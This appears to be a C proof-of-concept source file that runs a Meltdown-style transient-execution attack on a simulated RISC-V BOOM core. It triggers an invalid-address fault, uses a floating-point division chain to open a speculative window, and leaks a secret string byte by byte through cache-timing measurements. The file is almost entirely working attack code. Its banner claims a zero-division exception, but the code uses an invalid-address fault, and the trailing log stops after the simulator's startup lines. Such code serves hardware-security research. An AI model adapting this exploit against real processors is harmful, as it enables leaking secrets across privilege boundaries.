#include <stdio.h>
#include <stdint.h> 
#include "encoding.h"
#include "cache.h"

#define ATTACK_SAME_ROUNDS 10 // amount of times to attack the same index
#define SECRET_SZ 26
#define CACHE_HIT_THRESHOLD 50

uint64_t array1_sz = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64];
uint8_t array2[256 * L1_BLOCK_SZ_BYTES];

char* secretString = "!\"#ThisIsTheBabyBoomerTest";


/**
 * reads in inArray array (and corresponding size) and outIdxArrays top two idx's (and their
 * corresponding values) in the inArray array that has the highest values.
 *
 * @input inArray array of values to find the top two maxs
 * @input inArraySize size of the inArray array in entries
 * @inout outIdxArray array holding the idxs of the top two values
 *        ([0] idx has the larger value in inArray array)
 * @inout outValArray array holding the top two values ([0] has the larger value)
 */
void topTwoIdx(uint64_t* inArray, uint64_t inArraySize, uint8_t* outIdxArray, uint64_t* outValArray)
{
    outValArray[0] = 0;
    outValArray[1] = 0;

    for (uint64_t i = 0; i < inArraySize; ++i)
    {
        if (inArray[i] > outValArray[0])
        {
            outValArray[1] = outValArray[0];
            outValArray[0] = inArray[i];
            outIdxArray[1] = outIdxArray[0];
            outIdxArray[0] = i;
        }
        else if (inArray[i] > outValArray[1])
        {
            outValArray[1] = inArray[i];
            outIdxArray[1] = i;
        }
    }
}


//setup an exception handler
static inline unsigned long long readmcause()
{
    unsigned long long  val;

    asm volatile("csrr %0, mcause" : "=r"(val));
    return val;
}


static inline unsigned long readfcsr()
{
    unsigned long  val;

    asm volatile("frcsr %0" : "=r"(val));
    return val;
}

uint8_t    iFlag = 0;

void handle_trap(uintptr_t cause, uintptr_t epc, uintptr_t regs[32])
{
    if(readmcause() == 0x5)
    {
        iFlag = 0;
    }
  
    //printf("\nWarn: now is in handle_trap().\n");
    //printf("mcause is 0x%llx.\n", readmcause());   
}

uint64_t   temp = 0;
uint8_t    dummy = 2;
#define BADADDR 0x100000000
long       ptr=BADADDR;

//float      iResult = 1.0;
//float      uNumber1 = 102.0;
//float      uNumber2 = 0.0;
//uint16_t     readNum = 0;

void victim_function(uint64_t idx, uint64_t iRound)
{
    uint64_t  cache_addr = array1[idx] * L1_BLOCK_SZ_BYTES;
    // printf("cache_addr:%lu \n", cache_addr);

    // create a speculative window by doing div operations (operation is (str_index << 4) / (2**4))
    
    /*
    array1_sz =  array1_sz << 4;
    asm("fcvt.s.lu	fa4, %[in]\n"
        "fcvt.s.lu	fa5, %[inout]\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fcvt.lu.s	%[out], fa5, rtz\n"
        : [out] "=r" (array1_sz)
        : [inout] "r" (array1_sz), [in] "r" (dummy)
        : "fa4", "fa5");
    */

    asm("addi t1, zero, 2 \n"
        "slli t2, t1, 0x4 \n"
        "fcvt.s.lu fa4, t1 \n"
        "fcvt.s.lu fa5, t2 \n"
        "fdiv.s fa5, fa5, fa4 \n"
        "fdiv.s fa5, fa5, fa4 \n"
        "fdiv.s fa5, fa5, fa4 \n"
        "fdiv.s fa5, fa5, fa4 \n"
        "fcvt.lu.s t2, fa5, rtz \n");

    // create a exception
    iFlag = 1;
#if 0
    volatile int c = 100;
	volatile int d = 0;
    printf("\nNow we begin to div zero!\n");
	printf("\nBefore div zero, fcsr=0x%lx",readfcsr());
    printf("\nNow we get c(100)/d(0)=0x%x\n", c/d);
	printf("After div zero, fcsr=0x%lx\n",readfcsr());
#endif
    //invalid address, mcause = 0x5
    //printf("access the invalid address \n");
    volatile int a = *(int *)ptr;
    if(iFlag)
    {
        temp = array2[cache_addr];
    }
    // bound speculation here just in case it goes over
    // printf("print1: skip running here in the exception handler\n");	    
    dummy = rdcycle();
    // printf("print2: idx=%lu, iRound=%lu, the flag is:%d \n", idx, iRound, iFlag);
}





int main(void)
{
    uint64_t attackIdx = (uint64_t)(secretString - (char*)array1);
    uint64_t start, diff;
    static uint64_t results[256];

    printf("================= This is a POC of Meltdown (zero division exception) ========================= \n");
    printf("the secret key is:%s \n", secretString);

    // try to read out the secret
    for(uint64_t len = 0; len < SECRET_SZ; ++len)
	{

        // clear results every round
        for(uint64_t cIdx = 0; cIdx < 256; ++cIdx)
		{
            results[cIdx] = 0;
        }

        // run the attack on the same idx ATTACK_SAME_ROUNDS times
        for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound)
		{

            // make sure array you read from is not in the cache
            flushCache((uint64_t)array2, sizeof(array2));
            victim_function(attackIdx, atkRound);
            
            // read out array 2 and see the hit secret value
            // this is also assuming there is no prefetching
            for (uint64_t i = 0; i < 256; ++i)
            {
                uint64_t  uiTemp = 0;  //introduced a dummy variable to prevent compiler optimizations
                start = rdcycle();
                dummy &= array2[i * L1_BLOCK_SZ_BYTES];
                diff = (rdcycle() - start);

                if ( diff < CACHE_HIT_THRESHOLD )
				{
					//printf("len=%ld, atkRound=%ld, add 1 to results[%ld], diff=%lu \n", len, atkRound, i, diff);
                    results[i] += 1;
                }
            }
        }
        
        // get highest and second highest result hit values
        uint8_t output[2];
        uint64_t hitArray[2];
        topTwoIdx(results, 256, output, hitArray);

        printf("len=%ld m[0x%p] = want(%c) =?= guess(hits,dec,char) 1.(%lu, %d, %c) 2.(%lu, %d, %c)\n", len, (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], hitArray[1], output[1], output[1]); 

        // read in the next secret 
        ++attackIdx;
    }

    return 0;
}


/*================================================== the complete log =================================================*/
/* 
shawnliu@shawnliu-Aspire-TC-780:/media/shawnliu/AI_DISK/sonicboom/chipyard/sims/verilator$ ./simulator-chipyard-SmallBoomConfig ./spectre_stl_v4.riscv 
This emulator compiled with JTAG Remote Bitbang client. To enable, use +jtag_rbb_enable=1.
Listening on port 43251
[UART] UART0 is here (stdin/stdout).

*/